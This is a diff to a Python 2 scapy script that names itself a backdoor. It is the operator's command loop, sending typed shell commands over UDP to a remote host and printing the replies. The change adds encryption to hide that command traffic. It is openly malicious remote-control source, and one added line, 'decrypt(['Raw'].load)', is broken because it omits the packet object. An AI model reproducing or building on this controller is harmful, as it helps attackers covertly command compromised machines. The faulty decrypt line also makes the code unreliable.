@@ -1,8 +1,7 @@
 import argparse
 from scapy.all import *
-from Crypto.Cipher import AES
 from scapy.layers.inet import IP, UDP
-
+from crypto import *
 
 #Argparse setup
 parser = argparse.ArgumentParser(description="Backdoor")
@@ -16,7 +15,7 @@ args = parser.parse_args()
 def stp_filter(packet):
         # print('in filter')
         print("####################RESPONSE_START###################\n")
-        print packet['Raw'].load
+        print decrypt(['Raw'].load)
         print("####################RESPONSE_END#####################\n")
         return True
 
@@ -25,9 +24,10 @@ def stp_filter(packet):
 def main():
 
 
-#Main command and display loop
+#Main loop
     while 1:
             command = raw_input("Command to send:") + "#" + args.client_ip
+            command = encrypt(command)
             #print (command)
             packet = IP(dst=args.server_ip, src=args.client_ip)/UDP(sport=int(args.client_port), dport=int(args.server_port))/command
             #print packet['Raw'].load
